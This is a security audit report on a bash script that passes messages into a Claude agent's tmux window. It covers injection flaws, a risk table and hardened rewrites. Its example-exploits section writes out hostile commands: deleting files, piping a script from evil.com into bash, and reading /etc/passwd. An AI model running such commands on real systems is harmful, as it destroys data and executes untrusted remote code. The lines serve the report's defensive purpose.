# Security Analysis: send-claude-message.sh

## Executive Summary

The `send-claude-message.sh` script contains **CRITICAL** security vulnerabilities that allow for command injection, arbitrary code execution, and potential system compromise. The script passes user input directly to `tmux send-keys` without any validation or sanitization.

**Risk Level: HIGH** ⚠️

## How the Script Works

1. **Purpose**: Sends messages to a Claude agent running in a tmux window
2. **Usage**: `./send-claude-message.sh <session:window> <message>`
3. **Process**:
   - Takes two arguments: target window and message
   - Uses `tmux send-keys` to send the message to the specified window
   - Waits 0.5 seconds for UI registration
   - Sends Enter key to submit the message

## Critical Security Vulnerabilities

### 1. Command Injection via Message Parameter (CRITICAL)

**Vulnerability**: The script passes user input directly to `tmux send-keys` without any validation:
```bash
MESSAGE="$*"
tmux send-keys -t "$WINDOW" "$MESSAGE"
```

**Attack Vector**: An attacker can inject shell commands that will be executed in the target tmux window.

**Example Exploits**:
```bash
# Delete files
./send-claude-message.sh target:window "; rm -rf /tmp/*"

# Execute arbitrary commands
./send-claude-message.sh target:window "; curl evil.com/malware.sh | bash"

# Read sensitive files
./send-claude-message.sh target:window "; cat /etc/passwd"
```

### 2. Parameter Injection via Window Target (HIGH)

**Vulnerability**: The window parameter is not validated and passed directly to tmux:
```bash
WINDOW="$1"
tmux send-keys -t "$WINDOW" "$MESSAGE"
```

**Attack Vector**: Malicious window specifications can manipulate tmux behavior.

**Example Exploits**:
```bash
# Target multiple windows
./send-claude-message.sh "session:window session2:window2" "message"

# Use tmux format strings
./send-claude-message.sh "#{session_name}:#{window_name}" "message"
```

### 3. No Input Validation (HIGH)

**Issues**:
- No validation of window format
- No sanitization of special characters
- No length limits on messages
- No character encoding validation

### 4. Lack of Error Handling (MEDIUM)

**Issues**:
- No check if tmux is installed
- No verification if target window exists
- No error handling for tmux command failures
- Success message displayed even on failure

### 5. Information Disclosure (LOW)

**Issue**: The script echoes the full message including any injected content:
```bash
echo "Message sent to $WINDOW: $MESSAGE"
```

## Risk Assessment

| Vulnerability | Severity | Exploitability | Impact |
|--------------|----------|----------------|---------|
| Command Injection | CRITICAL | Easy | Full system compromise |
| Parameter Injection | HIGH | Moderate | Unintended tmux operations |
| No Input Validation | HIGH | Easy | Various attacks possible |
| No Error Handling | MEDIUM | Easy | Unreliable operation |
| Info Disclosure | LOW | Easy | Minor information leak |

## Recommended Fixes

### 1. Input Validation and Sanitization

```bash
#!/bin/bash

# Validate window format
validate_window() {
    local window="$1"
    if [[ ! "$window" =~ ^[a-zA-Z0-9_-]+:[a-zA-Z0-9_-]+$ ]]; then
        echo "Error: Invalid window format. Use session:window" >&2
        return 1
    fi
    return 0
}

# Sanitize message
sanitize_message() {
    local message="$1"
    # Remove potentially dangerous characters
    # Allow only alphanumeric, space, and basic punctuation
    echo "$message" | tr -cd '[:alnum:][:space:].,!?-'
}

# Check if tmux is available
if ! command -v tmux &> /dev/null; then
    echo "Error: tmux is not installed" >&2
    exit 1
fi

# Validate arguments
if [ $# -lt 2 ]; then
    echo "Usage: $0 <session:window> <message>" >&2
    exit 1
fi

WINDOW="$1"
shift
MESSAGE="$*"

# Validate window format
if ! validate_window "$WINDOW"; then
    exit 1
fi

# Check if window exists
if ! tmux list-windows -t "$WINDOW" &>/dev/null; then
    echo "Error: Window '$WINDOW' does not exist" >&2
    exit 1
fi

# Sanitize message
SAFE_MESSAGE=$(sanitize_message "$MESSAGE")

# Send message using printf to handle special characters safely
tmux send-keys -t "$WINDOW" -l "$SAFE_MESSAGE"
sleep 0.5
tmux send-keys -t "$WINDOW" Enter

echo "Message sent to $WINDOW"
```

### 2. Alternative Approach: Use tmux buffer

```bash
#!/bin/bash
# Safer approach using tmux buffer instead of send-keys

WINDOW="$1"
MESSAGE="$2"

# Create a temporary file with the message
TMPFILE=$(mktemp)
echo -n "$MESSAGE" > "$TMPFILE"

# Load into tmux buffer and paste
tmux load-buffer -t "$WINDOW" "$TMPFILE"
tmux paste-buffer -t "$WINDOW"
tmux send-keys -t "$WINDOW" Enter

rm -f "$TMPFILE"
```

## Safe Usage Guidelines

### DO:
- ✅ Always validate and sanitize user input
- ✅ Use tmux's `-l` flag for literal strings
- ✅ Implement proper error handling
- ✅ Validate window existence before sending
- ✅ Use temporary files for complex messages
- ✅ Log all operations for audit trails

### DON'T:
- ❌ Never pass user input directly to shell commands
- ❌ Don't trust any external input
- ❌ Avoid using `$*` for message concatenation
- ❌ Don't ignore tmux command exit codes
- ❌ Never echo sensitive information

## Immediate Actions Required

1. **STOP using the current script in production immediately**
2. Implement input validation and sanitization
3. Add comprehensive error handling
4. Consider using a more secure IPC mechanism
5. Audit all tmux automation scripts for similar vulnerabilities

## Testing Recommendations

Run the included `test-send-claude-message.sh` script to see the vulnerabilities in action (in a safe test environment only).

## Conclusion

The current implementation of `send-claude-message.sh` is fundamentally insecure and should not be used in any environment where untrusted input might be processed. The script requires a complete rewrite with security as the primary concern.